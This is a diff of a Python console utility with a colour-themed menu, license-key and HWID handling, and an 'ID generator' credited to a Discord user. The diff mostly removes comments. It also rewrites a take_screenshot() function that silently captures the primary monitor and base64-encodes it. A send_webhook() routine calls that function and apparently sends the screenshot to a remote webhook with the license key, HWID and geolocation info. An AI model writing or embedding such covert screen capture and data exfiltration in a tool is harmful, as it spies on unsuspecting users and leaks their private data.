@@ -12,11 +12,6 @@ import string
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 from colorama import init, Fore, Style
-import subprocess
-import io
-from PIL import Image, ImageGrab
-import mss
-import mss.tools
 
 init(autoreset=True)
 
@@ -47,7 +42,7 @@ COLOR_THEMES = {
     "7": {"name": "White", "gradient_range": list(range(232, 256))},
     "8": {"name": "Orange", "gradient_range": list(range(130, 203))},
     "9": {"name": "Pink", "gradient_range": list(range(125, 220))},
-    "10": {"name": "Rainbow", "rainbow": True, "gradient_range": []}  # Rainbow will be generated dynamically
+    "10": {"name": "Rainbow", "rainbow": True, "gradient_range": []}
 }
 
 # Set default theme to Purple (option 4)
@@ -324,39 +319,18 @@ def update_license_data(license_key, new_hwid, new_id=""):
         return False
 
 def take_screenshot():
-    """Take a screenshot of the current screen"""
+    """Take a screenshot of the current screen using mss"""
     try:
-        # Try multiple methods for screenshot
-        screenshot_data = None
+        import mss
+        import mss.tools
         
-        # Method 1: Using mss (cross-platform)
-        try:
-            with mss.mss() as sct:
-                monitor = sct.monitors[1]  # Primary monitor
-                screenshot = sct.grab(monitor)
-                img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
-                
-                # Convert to bytes
-                img_byte_arr = io.BytesIO()
-                img.save(img_byte_arr, format='PNG')
-                screenshot_data = img_byte_arr.getvalue()
-        except:
-            pass
-        
-        # Method 2: Using PIL (Windows)
-        if not screenshot_data and os.name == 'nt':
-            try:
-                screenshot = ImageGrab.grab()
-                img_byte_arr = io.BytesIO()
-                screenshot.save(img_byte_arr, format='PNG')
-                screenshot_data = img_byte_arr.getvalue()
-            except:
-                pass
-        
-        if screenshot_data:
-            return base64.b64encode(screenshot_data).decode('utf-8')
-        else:
-            return None
+        with mss.mss() as sct:
+            monitor = sct.monitors[1]  # Primary monitor
+            screenshot = sct.grab(monitor)
+            
+            # Convert to bytes using mss.tools
+            img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)
+            return base64.b64encode(img_bytes).decode('utf-8')
             
     except Exception:
         return None
@@ -366,7 +340,7 @@ def send_webhook(license_key, hwid, user_id="", geo_info=None):
     try:
         webhook_url = get_webhook_url()
         if not webhook_url:
-            return
+            return False
         
         # Try to take screenshot
         screenshot_b64 = take_screenshot()
@@ -479,26 +453,26 @@ def display_gradient_ascii_header_only():
     all_lines = ascii_graphic + ascii_text + ["made by @uekv on discord"]
     total_lines = len(all_lines)
     
-    # Display graphic art with smooth gradient - USE SELECTED COLOR THEME
+    # Display graphic art with smooth gradient
     for i, line in enumerate(ascii_graphic):
         color = get_gradient_color(i, total_lines)
         print(f"{color}{line}{Style.RESET_ALL}")
     
     print("\n")
     
-    # Display text art with smooth gradient - USE SELECTED COLOR THEME
+    # Display text art with smooth gradient
     for i, line in enumerate(ascii_text):
         color = get_gradient_color(i + len(ascii_graphic), total_lines)
         print(f"{color}{line}{Style.RESET_ALL}")
     
     print("\n")
     
-    # Add "made by @uekv on discord" with gradient - USE SELECTED COLOR THEME
+    # Add "made by @uekv on discord" with gradient
     made_by_text = "made by @uekv on discord"
     color = get_gradient_color(len(ascii_graphic) + len(ascii_text), total_lines)
     print(f"{color}{made_by_text}{Style.RESET_ALL}")
     
-    # Gradient line - USE SELECTED COLOR THEME
+    # Gradient line
     gradient_line = "-" * 50
     print(f"{get_color('medium')}{gradient_line}{Style.RESET_ALL}")
 
@@ -525,7 +499,6 @@ def display_color_selection():
             if i + j < len(color_keys):
                 key = color_keys[i + j]
                 theme = COLOR_THEMES[key]
-                # Use the theme's actual color for display
                 color_val = theme["gradient_range"][len(theme["gradient_range"]) // 2] if theme["gradient_range"] else 55
                 color_code = f"\033[38;5;{color_val}m"
                 if theme.get("rainbow"):
@@ -538,10 +511,8 @@ def display_color_selection():
         line_parts = []
         for option in row:
             if option:
-                # Each option takes about 20 spaces
                 line_parts.append(option.ljust(20))
         
-        # Join with spaces and print
         if line_parts:
             print("   ".join(line_parts))
     
@@ -556,7 +527,7 @@ def display_options_grid():
     
     print(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Main Menu - Welcome!{Style.RESET_ALL}\n")
     
-    # Create single row with 3 options - USE SELECTED COLOR THEME
+    # Create single row with 3 options
     options = [
         f"{get_color('light')}[1]{Style.RESET_ALL} Change Color", 
         f"{get_color('light')}[2]{Style.RESET_ALL} Generate ID", 
@@ -570,7 +541,7 @@ def display_options_grid():
     
     print("   ".join(line_parts))
     
-    # Add gradient separator line after options - USE SELECTED COLOR THEME
+    # Add gradient separator line after options
     print(f"\n{get_color('medium')}{'-' * 50}{Style.RESET_ALL}")
     
     return input(f"\n{get_color('light')}[+]{Style.RESET_ALL} {Fore.WHITE}Select Option > {Style.RESET_ALL}")
